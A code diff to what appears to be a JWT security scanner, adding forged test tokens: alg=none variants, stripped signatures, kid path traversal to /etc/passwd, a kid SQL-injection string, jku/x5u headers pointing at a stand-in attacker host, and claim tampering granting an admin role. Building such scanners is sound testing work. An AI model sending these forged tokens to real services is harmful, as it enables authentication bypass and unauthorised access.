@@ -59,14 +59,47 @@ async def scan_endpoint(client: ScanClient, config: ScanConfig,
     hdr_none = b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
     body = b64u(json.dumps({"sub": "sx-test", "role": "admin"}).encode())
 
+    def _tok(hdr: dict, b: str = body, sig: str = "") -> str:
+        return f"{b64u(json.dumps(hdr).encode())}.{b}.{sig}"
+
     tests = [
-        # (name, token, success_indicator)
-        ("none-lowercase", f"{hdr_none}.{body}.", None),
-        ("none-uppercase", f"{b64u(json.dumps({'alg': 'None'}).encode())}.{body}.", None),
-        ("none-mixedcase", f"{b64u(json.dumps({'alg': 'nOnE'}).encode())}.{body}.", None),
-        ("empty-sig", f"{b64u(json.dumps({'alg': 'HS256'}).encode())}.{body}.", None),
-        ("kid-traversal", f"{b64u(json.dumps({'alg': 'HS256', 'kid': '../../../etc/passwd'}).encode())}.{body}.x", "kid"),
-        ("jwk-confusion", f"{b64u(json.dumps({'alg': 'RS256', 'jwk': {'kty': 'oct', 'k': 'c3g='}}).encode())}.{body}.x", "jwk"),
+        # --- TECHNIQUE: alg=none variants ---
+        ("none-lowercase", _tok({"alg": "none", "typ": "JWT"}), None),
+        ("none-uppercase", _tok({"alg": "None"}), None),
+        ("none-mixedcase", _tok({"alg": "nOnE"}), None),
+        ("none-notyp", _tok({"alg": "none"}), None),
+        # --- TECHNIQUE: empty / stripped signature ---
+        ("empty-sig", _tok({"alg": "HS256"}), None),
+        ("empty-sig-none", _tok({"alg": "none"}), None),
+        ("sig-whitespace", f"{hdr_none}.{body}. ", None),
+        ("sig-null", f"{hdr_none}.{body}.\x00", None),
+        # --- TECHNIQUE: two-segment token ---
+        ("two-segments", f"{hdr_none}.{body}", None),
+        # --- TECHNIQUE: kid path traversal ---
+        ("kid-traversal", _tok({"alg": "HS256", "kid": "../../../etc/passwd"}, sig="x"), "kid"),
+        ("kid-traversal-win", _tok({"alg": "HS256", "kid": "..\\..\\windows\\win.ini"}, sig="x"), "kid"),
+        ("kid-nullbyte", _tok({"alg": "HS256", "kid": "legit\x00../../etc/passwd"}, sig="x"), "kid"),
+        ("kid-sqli", _tok({"alg": "HS256", "kid": "' OR '1'='1"}, sig="x"), "kid"),
+        # --- TECHNIQUE: jku / x5u confusion ---
+        ("jku-evil", _tok({"alg": "RS256", "jku": "https://evil-sentinelx.example/keys.json"}, sig="x"), "jku"),
+        ("x5u-evil", _tok({"alg": "RS256", "x5u": "https://evil-sentinelx.example/cert.pem"}, sig="x"), "x5u"),
+        # --- TECHNIQUE: embedded JWK confusion ---
+        ("jwk-confusion", _tok({"alg": "RS256", "jwk": {"kty": "oct", "k": "c3g="}}, sig="x"), "jwk"),
+        ("jwk-none-kty", _tok({"alg": "none", "jwk": {"kty": "oct", "k": "c3g="}}), "jwk"),
+        # --- TECHNIQUE: algorithm confusion RS256->HS256 ---
+        ("confusion-hs256", _tok({"alg": "HS256", "typ": "JWT"}, sig="x"), None),
+        # --- TECHNIQUE: weak / none-adjacent algs ---
+        ("alg-hs256-debug", _tok({"alg": "HS256", "kid": "debug"}, sig="x"), None),
+        # --- TECHNIQUE: claim injection ---
+        ("claim-exp-future", f"{b64u(json.dumps({'alg':'none'}).encode())}.{b64u(json.dumps({'sub':'sx','exp':9999999999}).encode())}.", None),
+        ("claim-nbf-past", f"{b64u(json.dumps({'alg':'none'}).encode())}.{b64u(json.dumps({'sub':'sx','nbf':1}).encode())}.", None),
+        ("claim-no-exp", f"{b64u(json.dumps({'alg':'none'}).encode())}.{b64u(json.dumps({'sub':'sx'}).encode())}.", None),
+        # --- TECHNIQUE: header injection ---
+        ("hdr-cty", _tok({"alg": "none", "cty": "JWT"}), None),
+        ("hdr-kid-empty", _tok({"alg": "HS256", "kid": ""}, sig="x"), "kid"),
+        # --- TECHNIQUE: signature malleability ---
+        ("sig-bitflip", f"{hdr_none}.{body}.{'A'*43}", None),
+        ("sig-truncated", f"{hdr_none}.{body}.e30", None),
     ]
 
     for name, token, marker in tests:
